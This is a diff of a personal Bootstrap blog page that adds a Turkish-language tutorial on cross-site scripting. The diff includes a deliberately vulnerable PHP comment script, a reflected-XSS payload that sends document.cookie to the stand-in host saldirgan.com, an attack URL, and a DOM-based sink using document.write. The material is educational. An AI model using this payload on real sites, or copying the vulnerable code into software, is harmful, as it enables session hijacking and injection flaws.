@@ -9,7 +9,7 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>free blog bage</title>
+    <title>free blog page</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
@@ -28,7 +28,7 @@
         <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
         <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
     <![endif]-->
-
+    <link rel="stylesheet" href="resim.css">
 </head>
 
 <body id="page-top" class="index">
@@ -71,9 +71,9 @@
         <div class="container">
             <div class="row">
                 <div class="col-lg-12">
-                    <img class="img-responsive" src="img/myprofile.jpg" alt="">
+                    <img class="img-responsive" src="img/myprofile.jpg" alt="" width="350" ;>
                     <div class="intro-text">
-                        <span class="name">Hello Zalım World !</span>
+                      <span class="name">Hello Zalım World !</span>
                         <hr class="star-light">
                     </div>
                 </div>
@@ -245,13 +245,13 @@
                         <h3>Around the Web</h3>
                         <ul class="list-inline">
                             <li>
-                                <a href="https://www.facebook.com" class="btn-social btn-outline"><i class="fa fa-fw fa-facebook"></i></a>
+                                <a href="https://www.facebook.com/melik.kutluay" class="btn-social btn-outline"><i class="fa fa-fw fa-facebook"></i></a>
                             </li>
                             <li>
                                 <a href="https://accounts.google.com" class="btn-social btn-outline"><i class="fa fa-fw fa-google-plus"></i></a>
                             </li>
                             <li>
-                                <a href="https://twitter.com" class="btn-social btn-outline"><i class="fa fa-fw fa-twitter"></i></a>
+                                <a href="https://twitter.com/melikgltsry" class="btn-social btn-outline"><i class="fa fa-fw fa-twitter"></i></a>
                             </li>
 
                         </ul>
@@ -302,8 +302,7 @@
                                 <br>
                                 <h4>NEYDEN KAYNAKLANIR</h4>
                                 <p>Temel sebep dışarıdan kullanıcının girebildiği parametrelerin filtrelenmemesinden kaynaklanır. Sql injection da bu sebeple ortaya çıkmaktadır. Ama bu saldırı türünde sayfada "html" veya "javascript" kodları çalıştırmak mümkündür.
-
-Açığa sebebiyet verecek karakterler webmasterın sayfayı kodlarken ne şekilde kodladığına göre değişir ancak en yaygınları <br>( ", ' , < , > ,/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i) karakterleridir.</p>
+                                  Açığa sebebiyet verecek karakterler webmasterın sayfayı kodlarken ne şekilde kodladığına göre değişir ancak en yaygınları <br>( ", ' , < , > ,/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i) karakterleridir.</p>
                               <br>
                               <h4>NE AMAÇ İÇİN KULLANILIR ,    XSS İLE NELER YAPABİLİRİM</h4>
                               <p>Sitenizin işlediği verilerin hassaslığına bağlıdır. Bilgisayar korsanlarının XSS'den istifade ederek yaptıkları bazı şeyler:</p><br>
@@ -322,12 +321,47 @@ Açığa sebebiyet verecek karakterler webmasterın sayfayı kodlarken ne şekil
                               <p>Yorum textlerinde </p><br>
                               <h4>KAÇ TİP XSS TÜRÜ VARDIR</h4><br>
                               <p><h5>Stored XSS Saldırısı:</h5>Stored XSS saldırısı oldukça tehlikeli saldırı yöntemlerinden biridir. Daha çok forumlar, yorum alanları ve ziyaretçi defteri gibi alanlarda kullanılır. Bu alanlara gönderilen XSS kodları veritabanına kaydedilir. Sayfaya giren her kullanıcı için sayfayı görüntülerken XSS saldırısına maruz kalır.</p>
+                              <p>Kullanıcıdan alınan verinin yeterli filtrelemeden geçmemesi sonucunda veri tabanına kayıt edildikten sonra kayıt edilen bu veri başka bir yerde kullanılmak üzere veri tabanından çekileceği sırada ortaya çıkan bir xss zafiyet türüdür. Diğer türlerine oranla çok daha tehlikelidir. Çünkü bu xss zafiyet türünde zararlı kod veri tabanına kayıt edilir. Bu da şu anlama gelmektedir; Sisteme kayıtlı olan kullanıcılar zafiyetten etkilenen sayfayı ziyaret ettikleri anda oturum bilgilerini farkında olmadan saldırgana kaptırırlar. Tehlikeli olan nokta tam da burası işte. Saldırganın kimseyle muhattap olmaması... Diğer xss türlerinde saldırgan, kullanıcılara ilgili bağlantıya bir şekilde istek yaptırtmaya çalışır ama burada böyle bir durum söz konusu değildir. Payloadın kendisi sitenin veri tabanında kayıtlı zaten. Sadece payloadın select edileceği sayfayı kullanıcın ziyaret etmesi yeterli. Bu durumda sadece bir kişi veya bir grup değil sistemde kayıtlı olan herkes zafiyetten etkilenmiş olur.</p>
+                              <div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">#yorumlar.php sayfası. Kullanıcıların yorum yazması veya yazılan yorumları okuması için kodlandı.</span>
+<span class="c1">#veri tabanı bağlantısı ve seçimi vs. yapıldı...</span>
+
+<span class="nv">$mesaj</span>   <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'mesaj'</span><span class="p">];</span>
+<span class="nv">$user</span>    <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'user'</span><span class="p">];</span>
+<span class="nv">$ekle</span>    <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nx">yorumlar</span> <span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">mesaj</span><span class="p">)</span> <span class="nx">VALUES</span><span class="p">(</span><span class="s1">'$user'</span><span class="p">,</span> <span class="s1">'$mesaj'</span><span class="p">));</span>
+
+<span class="nv">$q</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">yorumlar</span><span class="p">);</span>
+<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$q</span><span class="p">))</span> <span class="p">{</span>
+<span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span><span class="o">.</span><span class="s2">" - "</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'mesaj'</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>stored xss yöntemi ile yapılan saldırıya bir örnek </p>
                               <p><h5>Reflected XSS Saldırısı:</h5> XSS saldırı URL alanlarına ve ya veri giriş alanlarına yapılır. Yapılan bu saldırı sadece XSS saldırısı yapan kullanıcı tarafından görülür. Ziyaretçiler bu saldırıyı göremezler. Bu yüzden URL alanında çalışan Reflected XSS saldırılarında, saldırgan URL adresini e-mail gibi çeşitli iletişim kanalları ile göndererek kurban avına çıkar.</p>
+                              <p>Reflected XSS saldırısında; kurbanın, hedef siteye istek yapması için kullanacağı bağlantıda(link) zararlı kod parçası bulundurmasıdır. İstek yapılırken bu zararlı kod ifa edilir ve dönen cevap saldırganın saldırganın kontrolunde olan bir uzak sunucuya gönderilir. Burada önemli olan nokta; zafiyetin istismar edilmesi tamamen kullanıcının insiyatifine kalan bir durumdur. Yani kullanıcı zararlı kod içeren bağlantıya tıklamadığı sürece zafiyetten etkilenmeyecektir.</p>
+                              <p>Ayrıca diğer türlerine oranla en çok karşılaşılan xss saldırı türüdür.</p>
+                              <p>GET metoduyla alınan bir "q" parametresinde reflected xss zafiyeti olan bir sistem</p>
+                              <p>http://zafiyetlisite.com?q=</p>
+                              <p>Saldırgan böyle bir senaryo karşısında aşağıdakine benzer bir payload kullanacaktır.</p>
+                              <div class="highlight"><pre><span class="nt">&lt;script&gt;</span>document.getElementById("sazan").src = "http://saldirgan.com?snif.php?q="+document.cookie;<span class="nt">&lt;/script&gt;</span></pre></div>
+                              <p>Yukarıdaki zararlı kod; sayfada id seçicisinin adı sazan olan bir elementi seçiyor(bu elementin <img /> olduğunu kabul edelim). Ve src niteliğine, saldırganın kontrolunda olan bir hostun adresini atıyor. Bu hostta bulunan sniff.php dosyasına, q paremetresinde kurbanın cookie değeri olacak şekilde get metoduyla bir istekte bulunuyor. Saldırgan da gelen bu isteği kayıt altına alıyor ve böylece hedef kullanıcının oturum bilgisini kendi oturum bilgisi ile değiştirerek giriş yapıyor.(Örnek senaryoda bunun nasıl yapıldığını göreceğiz.)
+                                Yani sonuç olarak saldırgan aşağıda bulunan bağlantıyı bir şekilde kurbana tıklatmak zorundadır. Daha doğru bir şekilde ifade edersek; saldırganın, kurbana aşağıdaki bağlantıya istek yapmasını sağlaması gerekir. İlla tıklaması gerekmez. Kendi kontrolunda olan başka bir site üzerinde bulunan src niteliğine sahip bir elemente aşağıdaki bağlantıyı gömmesi yeterlidir.</p>
+                                <pre><span></span>http://zafiyetlisite.com?q=<span class="nt">&lt;script&gt;</span>document.getElementById("sazan").src = "http://saldirgan.com?snif.php?q="+document.cookie<span class="nt">&lt;/script&gt;</span>
+                                </pre><br><p>Konuyu tamamını özetleyen bir diyagram inceleyiniz</p><br>
+                                  <img src="img/blog içi foto/reflected-xss.png" alt="">
                               <p><h5>DOM XSS Saldırısı:</h5> DOM XSS saldırısı en tehlikeli XSS saldırı türüdür. JavaScript kodlarının zararlı bir şekilde kullanılması ile yapılır. Bu saldırı türünde kullanılan DOM nesneleri ile hedef web sitesinin index’i değiştirilebilir, sayfanın kodları ile oynanabilir, virüs, trojan gibi zararlı kodlar sayfaya entegre edilebilir.</p>
-                              <h5>ÖRNEK</h5><p></p>
                               <br>
+                              <p>Yapısı gereği diğer iki türden farklıdır. Çünkü persistent ve reflected xss zafiyetleri sunucu taraflı filtrelemeler ile engellenebilirken DOM tabanlı xss de böyle bir durum söz konusu değildir. Bunun nedeni ise; bazı sorguların sonucuya iletilmeden kullanıcının browserında çalışması veya sunucudan cevap döndükten sonra sorgunun ifa edilmesiden kaynaklanmaktadır. Örneğin, url'de bulunan # (diez, hash,fragment) karakterinden sonraki ifade sunucuya iletilmez. Yani # den sonraki ifadeler için herhangi bir http trafiği oluşmaz. # ifadesi sayfa içerisinde bir bölüme geçiş yapmanın yanında farklı amaçlar içinde kullanılmaktadır.</p>
+                              <p>                              <p>İlgili bağlantıya tıkladığınızda sayfa içerisinde ilgili bölüme gelmektesiniz ve url yapısında da "#" ifadesinden sonra geldiğiniz kısmın id değeri yazmaktadır. Peki "#" karakterinden sonraki kısmın sunucuya iletilmemesi iyi bir olay mı?
+                              Bir saldırganın gözünden bakarsak kesinlikle çok iyi bir olay. Url'deki ifadenin bir kısmının sunucuya iletilmeden tarayıcı tarafından icra edilmesi tam olarak şu anlama gelmektedir: Sunucu tarafındaki alınan hiçbir güvenlik işe yaramayacaktır. Çünkü zararlı kod "#" ifadesinden sonra yazıldığı için sunucuya iletilmiyor ancak sunucudan kullanıcıya cevap döndükten sonra "#" ifadesinden sonraki kod tarayıcı tarafından ifa edilecek ve zafiyet bu şekilde istismar edilmiş olacak.</p></p>
+                              <pre><span></span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'#'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+                                <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
+                              </pre><br>
+                              <img src="img/blog içi foto/dom-based-xss.png" alt=""><br>
                               <h4>XSS AÇIĞINI NASIL KAPATABİLİRİM</h4>
                               <br><p>Saklanan XSS saldırılarına karşı koruma sağlamak için, veri deposundan gelen dinamik içeriğin bir sayfaya JavaScript eklenmesi için kullanılamadığından emin olun.</p>
+                                  <p>Kodunuzu yazarken filtreleme sırasında bu bölümlerde "A dan Z ye 0 dan 9 <,',", >" gibi ifadeler için kontrol yapmanız gerekmektedir</p>
+                              <br>
 
                             <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                         </div>
